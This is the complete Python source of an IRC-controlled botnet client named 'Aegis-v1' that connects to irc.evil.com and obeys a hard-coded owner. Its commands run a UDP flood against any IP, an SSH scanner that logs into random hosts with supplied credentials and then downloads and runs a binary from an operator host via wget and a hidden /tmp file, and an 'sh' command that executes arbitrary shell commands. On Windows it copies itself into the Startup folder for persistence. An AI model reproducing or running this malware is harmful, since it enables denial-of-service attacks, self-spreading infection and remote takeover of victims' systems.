version = "Aegis-v1"

import socket, ssl, time, sys, os, shutil, random, string, subprocess, paramiko
from threading import Thread
from enum import Enum

irc_server   = "irc.evil.com" # irc server to connect to
irc_port     = 6667
irc_channels = "#hell" # space separated
use_ssl      = False
irc_nickname = (''.join([random.choice(string.ascii_letters) for n in range(5)])).upper()

command_character = "@"

disable_passwd = "Mysecretevilpasswd"

bot_owner = ["target_"] # bot will listen only to your commands

disabled = False # choose whether to be disabled or enabled by default when joining.

############################################################################################################
############################################################################################################

class IRCFormat:
    Action    = "\x01"
    Bold      = "\x02"
    Color     = "\x03"
    Italic    = "\x1D"
    Underline = "\x1F"
    Swap      = "\x16" #Swaps BG and FG colors
    Reset     = "\x0F"

class IRC_Client(object):

    def __init__(self, nickname):
        self.nickname = nickname

    def connect(self, server):
        if use_ssl:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock = ssl.wrap_socket(self.sock)
        else:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((server.address, server.port))
        self.sock.setblocking(True)

        self.send_raw("NICK " + self.nickname)
        self.send_raw("USER " + self.nickname + " 0 * :Aegis")

    def send_raw(self, message):
        if not message == "":
            self.sock.send((message + "\r\n").encode("UTF-8"))

    def send(self, message, channel):
        self.send_raw("PRIVMSG " + channel + " :" + message)

    def notice(self, message, nickname):
        self.send_raw("NOTICE " + nickname + " :" + message)

    def action(self, message, channel):
        self.send(Format("ACTION " + message, IRCFormat.Action), channel)

    def join(self, channel):
        self.send_raw("JOIN " + channel)

    def exit(self):
        self.send_raw("QUIT")

    def set_mode(self, nickname, mode):
        self.send_raw("MODE " + nickname + " +" + mode)

    def recieve_raw(self):
        return self.sock.recv(4096).decode("UTF-8","ignore")

    def recieve(self):
        raw = self.recieve_raw()
        return IRC_Data(raw)

class IRC_Server(object):
    def __init__(self, address, port):
        self.address = address
        self.port = port

    def toString(self):
        return self.address + ":" + self.port

class IRC_Data(object):
    def __init__(self, input):

        self.type_command = IRC_CommandType.Unknown

        if input[:1] == ":":

            input = input[1:]
            sender = input.split()[0]

            if "!" in sender and "@" in sender:
                self.sender_type = IRC_SenderType.Client
                self.sender = IRC_User(sender)
            else:
                self.sender_type = IRC_SenderType.Server
                self.sender = sender


            try:
                if input.split()[1] == "JOIN":
                    self.type_command = IRC_CommandType.Join
                    self.channel = input.split()[2][1:]
            except:
                pass

            try:
                if input.split()[1] == "MODE":
                    self.type_command = IRC_CommandType.Mode
                    self.nickname = input.split()[2]
                    self.mode = input.split()[3]
                    if len(input.split(":", 1)) == 1:
                        self.channel = None
                    else:
                        self.channel = input.split(":", 1)[1]
            except:
                pass

            try:
                if input.split()[1] == "PRIVMSG" and not input.split(":")[1].split()[0] == IRCFormat.Action + "ACTION":
                    self.type_command = IRC_CommandType.Message
                    self.channel = input.split()[2]
                    self.message = input.split(":", 1)[1]
            except:
                pass

            try:
                if input.split()[1] == "PRIVMSG" and input.split(":")[1].split()[0] == "ACTION" and input[-1:] == IRCFormat.Action:
                    self.type_command = IRC_CommandType.Action
                    self.message = input.split(":", 1)[1].split(" ", 1)[1][:-1]
            except:
                pass

            try:
                if input.split()[1] == "INVITE":
                    self.type_command = IRC_CommandType.Invite
                    self.nickname = input.split()[2]
                    self.channel = input.split(":", 1)[1]
            except:
                pass

            try:
                if input.split()[1] == "NOTICE":
                    self.type = IRC_CommandType.Notice
                    self.notice_string = input.split()[1]
                    self.message = input.split(":", 1)[1]
            except:
                pass


            try:
                if input.split()[1] == "NICK":
                    self.type_command = IRC_CommandType.Nick
                    self.nickname = input.split()[2]
            except:
                pass

            try:
                if input.split()[1] == "TOPIC":
                    self.channel = input.split()[2]
                    self.message = input.split(":", 1)[1]
            except:
                pass

            try:
                if input.split()[1] == "QUIT":
                    self.type_command = IRC_CommandType.Quit
                    self.message = input.split(":", 1)[1]
            except:
                pass

        else:
            self.sender_type = None
            self.sender = None

            try:
                if input.split()[0] == "PING":
                    self.type_command = IRC_CommandType.Ping
                    self.data = input.split()[1]
            except:
                pass


class IRC_CommandType(Enum):
    Unknown =  0
    Join    =  1
    Mode    =  2
    Message =  3
    Action  =  4
    Invite  =  5
    Notice  =  6
    Nick    =  7
    Ping    =  8
    Kick    =  9
    Topic   = 10
    Quit    = 11

class IRC_SenderType(Enum):
    Server = 0
    Client = 1

class IRC_User(object):
    def __init__(self, input):
        self.nickname = input.split("!")[0]
        self.username = input.split("!")[1].split("@")[0]
        self.host     = input.split("@")[1]

    def toString(self):
        return self.nickname + "!" + self.username + "@" + self.host

class IRC_Mode:
    Bot      = "B"
    Ban      = "b"
    Operator = "a"


def isWindows():
    if os.name == "nt":
        return True
    else:
        return False

def vaild_ip(address):
    try:
        socket.inet_aton(address)
        if address.count(".") == 3:
            return True
        else:
            return False
    except:
        return False

class FirstPingThread(Thread):
    def run(self):
        pingis = bot.sock.recv(9000).decode()
        pingis = bot.sock.recv(9000).decode()
        if pingis.split()[0] == "PING":
            bot.send_raw("PONG " + pingis.split()[1])

#############################################################################################################
#############################################################################################################

if isWindows():
    try:
        shutil.copyfile(os.path.abspath(os.path.split(sys.argv[0])[0]) + "\\" + __file__[:len(__file__)-3] + ".exe", "C:/Users/" + str(os.getlogin()) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/pythonfile" + ".exe")
    except:
        pass

bot = IRC_Client(irc_nickname)
server = IRC_Server(irc_server, int(irc_port))

time.sleep(2)

bot.connect(server)

FirstPingThread().start()

#Wait a bit
time.sleep(3)

bot.set_mode(bot.nickname, IRC_Mode.Bot)

time.sleep(7)

#Join channels
for channel in irc_channels.split():
    bot.join(channel)

#############################################################################################################
#############################################################################################################

flood_threads = []

class FloodThread(Thread):
    def __init__(self, ip, port, duration, channel):
        Thread.__init__(self)
        self.ip       = ip
        self.port     = port
        self.duration = duration
        self.channel  = channel

    def run(self):
        flood_threads.append(self)

        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        bytes = random._urandom(1024)

        timeout = time.time() + self.duration

        global sent
        sent = 0

        bot.send("Attacking " + str(self.ip) + " on port " + str(self.port) + ".", self.channel)

        while 1:
            if time.time() > timeout:
                if self in flood_threads:
                    self.end(sent)
                else:
                    break
            else:
                pass

            if self not in flood_threads:
                break

            else:
                udp_socket.sendto(bytes, (self.ip, self.port))
                sent += 1

    def end(self, sent):
        bot.send("Attack on " + self.ip + " has finished. Sent " + str(sent) + " packages.", self.channel)
        flood_threads.remove(self)

scan_threads = []

class ScanThread(Thread):
    def __init__(self, ip_range, host, file, credentials, channel):
        Thread.__init__(self)
        self.ip_range    = ip_range
        self.host        = host
        self.file        = file
        self.credentials = credentials
        self.channel     = channel

    def run(self):
        scan_threads.append(self)

        while 1:
            if self not in scan_threads:
                break

            else:
                try:
                    socket.inet_aton(self.ip_range)

                    if self.ip_range.count(".") == 1:
                        host = self.ip_range + "." + str(random.randrange(0,254)) + "." + str(random.randrange(0,254))
                    elif self.ip_range.count(".") == 2:
                        host = self.ip_range + "." + str(random.randrange(0,254))
                    else:
                        bot.send("Invalid ip range!", self.channel)
                        self.end()

                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)
                        s.connect((host, 22))
                        s.close()
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(host, port = 22, username = self.credentials.split(":")[0], password = self.credentials.split(":")[1], timeout = 3)
                        stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                        if b"inet addr" in stdout.read():
                            ssh.exec_command("wget http://" + self.host + "/" + self.file + " -O /tmp/." + self.file + "; chmod +x /tmp/." + self.file + "; /tmp/." + self.file + " &")
                            bot.send("Infected " + host + ".", self.channel)
                        else:
                            pass

                    except:
                        pass

                except:
                    bot.send("Invalid ip range!", self.channel)
                    self.end()

    def end(self):
        scan_threads.remove(self)


class HelpData(object):
    def __init__(self, command, description):
        self.command = command
        self.description = description

while True:

    data = bot.recieve()
    #Respond to pings
    if data.type_command == IRC_CommandType.Ping:
        bot.send_raw("PONG " + data.data)

    if data.sender_type == IRC_SenderType.Client and data.type_command == IRC_CommandType.Message and data.sender.nickname in bot_owner:

        #Treats multiple args in quotes as a single arg
        args = []
        args_temp = data.message.split()

        arg_index = 0
        while arg_index <= len(args_temp) - 1:

            arg = args_temp[arg_index]
            if arg[:1] == '"' or arg == '"':

                if arg[-1:] == '"' and not arg == '"':

                    arg_temp = arg[1:-1]
                    arg_index += 1

                else:

                    arg_temp = arg[1:]
                    arg_index += 1

                    for arg2 in args_temp[arg_index:]:
                        if arg2[-1:] == '"' or arg2 == '"':
                            arg_temp += " " + arg2[:-1]
                            arg_index += 1
                            break
                        else:
                            arg_temp += " " + arg2
                            arg_index += 1

            else:
                arg_temp = arg
                arg_index += 1

            args.append(arg_temp)

        if args[0][:len(command_character)] == command_character:

            if args[0][len(command_character):] == irc_nickname:
                cmd = args[1].lower()

            elif args[0][len(command_character):] == "*":
                cmd = args[1].lower()

            else:
                cmd = None

            if cmd == "disable":
                if len(args) == 3:
                    if args[2] == disable_passwd:
                        bot.send("Password accepted!", data.channel)
                        disabled = True
                    else:
                        pass
                else:
                    pass

            if cmd == "enable":
                if len(args) == 3:
                    if args[2] == disable_passwd:
                        bot.send("Password accepted!", data.channel)
                        disabled = False
                    else:
                        pass
                else:
                    pass

            if not disabled:

                if cmd == "version":
                    bot.send(version, data.channel)

                if cmd == "udp":
                    if len(args) == 5:
                        start_new_thread = True
                        for thread in flood_threads:
                            bot.send("Attack already running!", data.channel)
                            start_new_thread = False
                            break

                        if start_new_thread:
                            try:
                                if vaild_ip(args[2]):
                                    FloodThread(args[2], int(args[3]), int(args[4]), data.channel).start()
                                else:
                                    bot.send("'" + args[2] + "' is not a valid ip!", data.channel)
                            except:
                                pass

                    else:
                        if len(args) == 3:
                            if args[2] == "end":
                                thread_to_end = None
                                for thread in flood_threads:
                                    if thread.channel == data.channel:
                                        thread_to_end = thread
                                        break

                                if thread_to_end == None:
                                    bot.send("There are no attacks running!", data.channel)

                                else:
                                    thread_to_end.end(sent)
                            else:
                                pass

                if cmd == "sh":
                    if len(args) > 2:
                        try:
                            process = subprocess.Popen(args[2:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        except:
                            bot.send("Failed sending command.", data.channel)

                        for line in process.stdout.readlines():
                            bot.send(line.strip(), data.channel)
                    

                if cmd == "die":
                    bot.exit()
                    exit()

                if cmd == "scan":
                    if len(args) == 7:
                        start_new_thread = True
                        for thread in scan_threads:
                            bot.send("Scanner is already on!", data.channel)
                            start_new_thread = False
                            break

                        if start_new_thread:
                            try:
                                for i in range(int(args[6])):
                                    ScanThread(args[2], args[3], args[4], args[5], data.channel).start()
                                bot.send("Scanner on!", data.channel)
                            except:
                                bot.send("Unable to start threads!", data.channel)
                    else:
                        if len(args) == 3:
                            if args[2] == "stop":
                                thread_count = 0

                                for thread in scan_threads[:]:
                                    if thread.channel == data.channel:
                                        thread_count += 1
                                        thread.end()

                                if thread_count == 0:
                                    bot.send("Scanner not running!", data.channel)

                                else:
                                    bot.send("Ended " + str(thread_count) + " threads.", data.channel)
                                    bot.send("Scanner off!", data.channel)

                            else:
                                pass

                if cmd == "help":
                    help_data = [
                        HelpData("version", "- build version."),
                        HelpData("udp", "<ip> <port> <time> - udp flooder."),
                        HelpData("disable/enable", "<password> - disables or enables the bot."),
                        HelpData("die", "- kills the knight."),
                        HelpData("scan", "<range> <host> <binary> <user:password> <threads> - Advanced SSH scanner - unlike others, this one really works."),
                        HelpData("sh", "<command> - Run a command on the host.")
                    ]

                    if len(args) == 2:
                        command_list = []

                        for command in help_data:
                            command_list.append(command.command)

                        bot.send("Available commands: " + ", ".join(command_list), data.channel)
                        bot.send("Use " + command_character + cmd + " <command> for more detailed info.", data.channel)

                    else:
                        command = " ".join(args[2:])

                        help_output = 'Unknown command "' + command + '". Please use "' + command_character + cmd + '" for a list of available commands.'

                        for help in help_data:
                            if help.command.lower() == command.lower():
                                help_output = help.command + " " + help.description
                                break

                        help_output = data.sender.nickname + ", " + command_character + help_output
                        bot.send(help_output, data.channel)
    else:
        pass
